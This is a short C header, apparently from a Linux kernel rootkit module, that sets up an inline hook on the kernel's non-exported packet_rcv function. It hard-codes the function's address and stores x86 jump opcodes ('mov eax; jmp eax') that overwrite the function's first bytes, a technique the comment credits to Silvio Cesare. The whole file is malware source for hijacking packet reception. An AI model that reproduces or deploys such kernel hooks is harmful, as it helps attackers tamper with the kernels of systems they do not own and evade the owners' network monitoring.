/*
 *  pktrcv.h <header for datalink hook funcs...>
 *
 *  160202  ulix <ulix@gmx.it>
 */

#define dip(addr) ntohs((addr).s6_addr16[0]), ntohs((addr).s6_addr16[1]), \
                  ntohs((addr).s6_addr16[2]), ntohs((addr).s6_addr16[3]), \
                  ntohs((addr).s6_addr16[4]), ntohs((addr).s6_addr16[5]), \
                  ntohs((addr).s6_addr16[6]), ntohs((addr).s6_addr16[7])

#define SIZE  7

/** our pointer to old packet_rcv kernel func **/
int (*old_packet_rcv)
(struct sk_buff *, ...) = (int (*)(struct sk_buff *, ...))0xc0243620;

/** byte codes to play with non-exported funcs... silvio docet **/
static char old_rcv_code[7];
static char new_rcv_code[7] = "\xb8\x00\x00\x00\x00\xff\xe0";
